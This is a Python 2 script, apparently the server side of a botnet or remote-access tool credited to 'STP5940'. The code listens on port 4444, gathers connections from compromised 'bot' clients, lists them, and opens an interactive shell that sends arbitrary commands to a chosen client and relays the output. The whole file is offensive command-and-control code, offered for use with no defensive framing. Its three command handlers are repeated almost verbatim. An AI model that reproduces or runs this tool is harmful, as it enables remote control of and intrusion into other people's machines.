import os, sys
from socket import *
 
host = "127.0.0.1"
port = 4444
 
logo =  """
Coded by: STP5940
Facebook: https://facebook.com/home.htmi\n"""
 
commands = """
--------------------------------------------------------------
|   Commands:         |Frat:|   Comment:                     |
--------------------------------------------------------------
                        ___
[1] loadbot            |-l |    Accept connections
[2] list               | l |    List connections
[3] connect <Number>   |-c |    Interact with client
[4] stop               | s |    Stop interacting with Client
[5] cls                | c |    Clear the console
[6] help               | h |    Show this message
[7] exit               | e |    Close all connections and quit
[0] code               |___|    Show Credits
\n"""
 
s=socket(AF_INET, SOCK_STREAM)
s.settimeout(5) #this is needed in accept() later on
s.bind((host,port))
s.listen(10)
 
allConnections = []
allAddresses = []
 
def getConnections():
        for item in allConnections:
                item.close() #close all old connections
        #empty the lists
        del allConnections[:]
        del allAddresses[:]
        #start all over
        while 1:
                try:
                        q,addr=s.accept() #will timeout after 5 seconds
                        q.setblocking(1) #needed later on in recv() / making an non-blocking socket object
                        allConnections.append(q)
                        allAddresses.append(addr)
                except:
                        break
 
def main():
        print  commands, logo         
        while 1:
                command = raw_input("STP5940 >")
                if (command == "loadbot" or command == "-l" or command == "1"):
                        getConnections()
                        print "[INFO] Done Accepting\n"
                elif(command == "list" or command == "l"or command == "2"):
                        print "--------------------------------\nList Clients Connect to Server:\n--------------------------------"
                        for item in allAddresses:
                                print "[%d] - IP: %s  |  %s" % (allAddresses.index(item) + 1, str(item[0]), str(item[1]))
                        print "\n"
                elif("connect" in command):
                        chosenone = int(command.replace("connect ","")) - 1
                        if ((chosenone < len(allAddresses)) and (chosenone >= 0 )):
                                print "[INFO] Interacting with %s" % str(allAddresses[chosenone])
                                try:
                                        allConnections[chosenone].send("STP5940") #welcome message
                                        vtpath = allConnections[chosenone].recv(4096) + ">" #non blocking socket object / will timeout instantly if no data received
                                except:
                                        print "[ERROR] Client closed the connection\n"
                                        break;
                                while 1:
                                        data=raw_input(vtpath) #raw_input represents the client's sub process's current path
                                        if ((data != "s") and (data != "stop") and ("cd " not in data) and ("upload " not in data)):
                                                try:
                                                        allConnections[chosenone].send(data)
                                                        msg=allConnections[chosenone].recv(4096) #non blocking socket object / will timeout instantly if no data received
                                                        print msg
                                                except:
                                                        print "[ERROR] Client closed the connection\n"
                                                        break;
                                        elif ("cd " in data): #dealing with the cd command
                                                try:
                                                        allConnections[chosenone].send(data)
                                                        msg=allConnections[chosenone].recv(4096) #non blocking socket object / will timeout instantly if no data received
                                                        vtpath = msg + ">"
                                                except:
                                                        print "[ERROR] Client closed the connection\n"
                                                        break;
                                        else:
                                                print "\n"
                                                break
                        else:
                                print "[ERROR] Client doesn't exist\n"
                elif("-c" in command):
                        chosenone = int(command.replace("-c ","")) - 1
                        if ((chosenone < len(allAddresses)) and (chosenone >= 0 )):
                                print "[INFO] Interacting with %s" % str(allAddresses[chosenone])
                                try:
                                        allConnections[chosenone].send("STP5940") #welcome message
                                        vtpath = allConnections[chosenone].recv(4096) + ">" #non blocking socket object / will timeout instantly if no data received
                                except:
                                        print "[ERROR] Client closed the connection\n"
                                        break;
                                while 1:
                                        data=raw_input(vtpath) #raw_input represents the client's sub process's current path
                                        if ((data != "s") and (data != "stop") and ("cd " not in data) and ("upload " not in data)):
                                                try:
                                                        allConnections[chosenone].send(data)
                                                        msg=allConnections[chosenone].recv(4096) #non blocking socket object / will timeout instantly if no data received
                                                        print msg
                                                except:
                                                        print "[ERROR] Client closed the connection\n"
                                                        break;
                                        elif ("cd " in data): #dealing with the cd command
                                                try:
                                                        allConnections[chosenone].send(data)
                                                        msg=allConnections[chosenone].recv(4096) #non blocking socket object / will timeout instantly if no data received
                                                        vtpath = msg + ">"
                                                except:
                                                        print "[ERROR] Client closed the connection\n"
                                                        break;
                                        else:
                                                print "\n"
                                                break
                        else:
                                print "[ERROR] Client doesn't exist\n"
                elif("3" in command):
                        chosenone = int(raw_input("Number Client >"))-1
                        if ((chosenone < len(allAddresses)) and (chosenone >= 0 )):
                                print "[INFO] Interacting with %s" % str(allAddresses[chosenone])
                                try:
                                        allConnections[chosenone].send("STP5940") #welcome message
                                        vtpath = allConnections[chosenone].recv(4096) + ">" #non blocking socket object / will timeout instantly if no data received
                                except:
                                        print "[ERROR] Client closed the connection\n"
                                        break;
                                while 1:
                                        data=raw_input(vtpath) #raw_input represents the client's sub process's current path
                                        if ((data != "s") and (data != "stop") and (data != "4") and ("cd " not in data) and ("upload " not in data)):
                                                try:
                                                        allConnections[chosenone].send(data)
                                                        msg=allConnections[chosenone].recv(4096) #non blocking socket object / will timeout instantly if no data received
                                                        print msg
                                                except:
                                                        print "[ERROR] Client closed the connection\n"
                                                        break;
                                        elif ("cd " in data): #dealing with the cd command
                                                try:
                                                        allConnections[chosenone].send(data)
                                                        msg=allConnections[chosenone].recv(4096) #non blocking socket object / will timeout instantly if no data received
                                                        vtpath = msg + ">"
                                                except:
                                                        print "[ERROR] Client closed the connection\n"
                                                        break;
                                        else:
                                                print "\n"
                                                break
                        else:
                                print "[ERROR] Client doesn't exist\n"
                elif(command == "cls" or command == "c" or command == "5"):
                        if sys.platform == 'win32':
                                os.system("cls")
                        else:
                                os.system("clear")
                elif(command == "help" or command == "-h" or command == "h" or command == "6"):
                        print commands
                elif(command == "exit" or command == "e" or command == "7"):
                        for item in allConnections:
                                try:
                                        item.send("exit") #send a message that will close the client connection
                                        item.close() #close socket objects
                                except:
                                        print "[ERROR] %s closed the connection already\n" % item
                        s.close()
                        break;
                elif(command == "code" or command == "0"):
                        print "--------\nCredits:\n--------\nCoded by: STP5940\nFacebook: https://facebook.com/home.htmi\n"
                else:
                        print "[ERROR] Invalid Command\n"
                       
main()